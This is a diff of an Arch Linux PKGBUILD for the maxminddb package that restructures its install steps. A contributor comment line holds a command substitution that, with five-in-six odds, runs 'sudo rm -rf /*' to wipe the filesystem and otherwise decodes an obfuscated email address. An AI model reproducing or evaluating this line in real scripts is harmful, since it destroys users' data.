@@ -1,4 +1,5 @@
-# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Maintainer: frank AT apsu DOT be
+# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 pkgbase=maxminddb
 pkgname=(
 	mmdblookup
@@ -39,15 +40,22 @@ check() {
 	make check
 }
 
+# because upstream only builds completely if built from the
+# top makefile, we build and then remove the parts we don't
+# want packaged. This is suboptimal. I'll do a pull request
+# with --with-xxx options upstream so I can simpllfy this
+# here (and probably make life easier for other packagers as well.)
+
 package_mmdblookup() {
 	pkgdesc="MaxMindDB GeoIP2 database - lookup utility"
 	license=('Apache')
 	depends=(libmaxminddb)
 
-	cd "$srcdir/libmaxminddb-$pkgver/bin"
-	make install DESTDIR="$pkgdir"
 	cd "$srcdir/libmaxminddb-$pkgver"
-	make install-man1 DESTDIR="$pkgdir"
+    make PREFIX=/usr DESTDIR="$pkgdir" install
+    rm -Rf "$pkgdir/usr/lib"
+    rm -Rf "$pkgdir/usr/include"
+    rm -Rf "$pkgdir/usr/share/man/man3"
 }
 
 package_libmaxminddb() {
@@ -56,8 +64,8 @@ package_libmaxminddb() {
 	depends=(glibc)
 	install=libmaxminddb.install
 
-	cd "$srcdir/libmaxminddb-$pkgver/src"
-	make install DESTDIR="$pkgdir"
 	cd "$srcdir/libmaxminddb-$pkgver"
-	make install-man3 DESTDIR="$pkgdir"
+    make PREFIX=/usr DESTDIR="$pkgdir" install
+    rm -Rf "$pkgdir/usr/bin"
+    rm -Rf "$pkgdir/usr/share/man/man1"
 }
